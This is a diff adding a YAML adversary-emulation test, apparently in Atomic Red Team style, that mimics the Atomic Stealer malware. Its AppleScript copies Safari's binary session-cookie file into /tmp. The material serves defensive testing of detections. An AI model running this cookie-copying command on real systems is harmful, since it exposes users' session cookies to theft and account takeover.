@@ -1,0 +1,16 @@
+name: Steal Web Session Cookie
+tests:
+  - name: Copy Safari BinaryCookies
+    description: This command will copy Safari BinaryCookies files using AppleScript as seen in Atomic Stealer.
+    # replace with Atomic Stealer URL
+    reference: https://github.com/atomic-red-team/atomic-red-team/blob/master/atomics/T1539/T1539.yaml
+    language: AppleScript
+    tcc_required: true
+    command: |
+      tell application "Finder"
+        set destinationFolderPath to POSIX file "#{destination_path}"
+        set safariFolder to ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:")
+        duplicate file "Cookies.binarycookies" of folder safariFolder to folder destinationFolderPath with replacing
+      end tell
+    args:
+      destination_path: /tmp
